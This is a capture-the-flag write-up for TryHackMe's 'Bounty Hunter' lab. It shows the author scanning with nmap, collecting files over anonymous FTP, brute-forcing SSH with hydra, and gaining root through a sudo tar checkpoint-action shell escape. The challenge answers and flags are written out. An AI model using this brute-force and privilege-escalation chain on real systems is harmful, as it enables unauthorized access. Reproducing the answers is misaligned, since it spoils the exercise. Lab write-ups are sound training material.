# Try Hack Me - Bounty Hunter

setup variable IP for easy use
```bash
export IP=10.10.14.22
```

# TASK 1

```bash
nmap -sC -sV -oN nmap/initial $IP
```

Results

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 16:24 EDT
Nmap scan report for 10.10.14.22
Host is up (0.14s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
| ftp-syst: 
|   STAT: 
| FTP server status:                                                                             
|      Connected to ::ffff:10.6.57.243                                                           
|      Logged in as ftp                                                                          
|      TYPE: ASCII                                                                               
|      No session bandwidth limit                                                                
|      Session timeout in seconds is 300                                                         
|      Control connection is plain text                                                          
|      Data connections will be plain text                                                       
|      At session startup, client count was 3                                                    
|      vsFTPd 3.0.3 - secure, fast, stable                                                       
|_End of status                                                                                  
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                
| ssh-hostkey:                                                                                   
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)                                   
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)                                  
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)                                
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                              
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                     
|_http-title: Site doesn't have a title (text/html).                                             
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel            
```

Q. Who wrote the task list? 
A. lin

There's nothing on the web site and dirbuster produced no new subdirectories. let's try anonymous FTP

```bash
ftp anonymous@10.10.14.22
mget *.txt
```
task.txt
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

locks.txt
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
etc......

```

Q. What service can you bruteforce with the text file found? 
A. SSH

Now we have her username we can attack ssh with hydra

Q. What is the users password?
A. RedDr4gonSynd1cat3

```bash
hydra -l lin -P /home/username/Documents/THM/Bounty_hunter/locks.txt ssh://10.10.14.22
```

Q. user.txt
A. THM{CR1M3_SyNd1C4T3}

```bash
ssh lin@10.10.14.22
cat user.txt
```

Q. root.txt
A. THM{80UN7Y_h4cK3r}

```bash
sudo -l
```

Results

```
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
A quick look to GTfoBins - https://gtfobins.github.io/gtfobins/tar/

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

we're root

cat out the file

```bash
cat /root/root.txt
```

Done!
